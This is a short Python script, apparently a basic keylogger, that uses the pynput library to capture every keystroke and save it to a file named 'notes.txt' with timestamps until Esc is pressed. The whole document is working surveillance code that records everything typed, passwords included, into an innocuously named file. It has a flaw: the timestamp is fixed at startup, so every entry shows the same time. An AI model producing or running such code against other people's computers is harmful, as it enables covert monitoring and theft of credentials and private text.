from pynput.keyboard import Key, Listener
import datetime



keys = []
now = datetime.datetime.now()

def write_file(keys):
    with open("notes.txt", "w") as f:
        for key in keys:
            # removing '                           
             k = str(key).replace("'", " ")
             
             f.write(k)
             dt = now.strftime(" %y-%m-%d %H:%M:%S :: ")
             if k == "Key.enter":
                f.write(f" {dt}")
                f.write('\n')
        f.close()

def on_press(key):
    
    keys.append(key)
    write_file(keys)
    

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()
    

